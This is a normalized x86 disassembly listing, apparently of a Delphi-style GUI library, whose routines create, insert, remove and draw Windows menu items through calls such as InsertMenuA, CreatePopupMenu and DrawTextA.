mov edx esi
call sub_403f74
sub_45d46c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45f5fc
sub_45d48c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45f5d8
sub_45d4ac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45f5ec
sub_45d4cc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_45d4f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420754
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_45cfe4
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45ff08
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_45d574
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_461ea4
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_45f5a4
test eax eax
jg r-xdata
mov edx esi
call sub_45f93c
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_45f5b4
call sub_403190
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403190
lea eax [ esi + 0x44 ]
call sub_40d1d0
lea eax [ esi + 0x78 ]
call sub_40d1d0
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_45d990
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_41899c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4207a0
test bl bl
jle r-xdata
call sub_403190
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_45d628
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d883
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d88a
lea eax [ ebp - 0x40 ]
call sub_403f20
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_403fb8
mov eax ebx
call sub_45f5a4
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_45db38
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_40432c
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_45f5a4
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_45fb60
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_45cc8c
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4042a0
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4043e0
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_4043e0
push eax
mov eax ebx
call sub_45db38
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_45f17c
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_40432c
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_4043e0
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_45f5a4
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_45db38
mov [ ebp - 0x25 ] eax
sub_45d8a3
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_45d628
xor eax eax
pop ebp
retn
sub_45d8c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_46119c
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_460164
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_460660
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_45d064
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_45d938
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d982
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41d730
mov eax [ ebp - 0x4 ]
call sub_45ceec
mov edx eax
mov eax ebx
call sub_45f5d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d989
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_45d990
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_45da08
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_420824
sub_45d9cc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_420ba4
mov eax ebx
call sub_45f58c
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_45f58c
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_40338c
pop esi
pop ebx
retn
mov eax ebx
call sub_45da08
sub_45da08
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_45db38
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_45da08
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_45db38
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_45db38
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_45d8c8
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax ebp
call sub_45db38
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45dad8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_45f5a4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_45f5b4
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_45f5b4
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_45f5b4
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_45cbe0
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_45db38
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_45d8c8
mov eax [ rw-data ]
call sub_45cbe0
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_45db84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420acc
push ebx
push sub_45d938
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_45dbc8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45ddac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45fb60
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403fb8
test bh 0x4
je r-xdata
mov eax edi
call sub_46119c
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40432c
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424328
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4041e8
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_423d00
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_423d0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ddb3
lea eax [ ebp - 0xc ]
call sub_403f20
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424a0c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4041e0
push eax
mov eax [ ebp - 0xc ]
call sub_4043e0
push eax
mov eax [ ebp - 0x4 ]
call sub_424a0c
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_423a40
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4041e0
push eax
mov eax [ ebp - 0xc ]
call sub_4043e0
push eax
mov eax [ ebp - 0x4 ]
call sub_424a0c
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_423a40
mov eax 0xff00000d
call sub_423580
mov esi eax
mov eax 0xff000010
call sub_423580
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_423a40
jmp r-xdata
sub_45de18
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45e700
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245b0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_42420c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_423a40
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40432c
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_42420c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245b0
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45a9b4
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424a0c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424204
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_42420c
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4285d8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45e25f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4296c0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_423a40
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45a9b4
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_42420c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245b0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424204
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42a714
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4241e0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245b0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4245b0
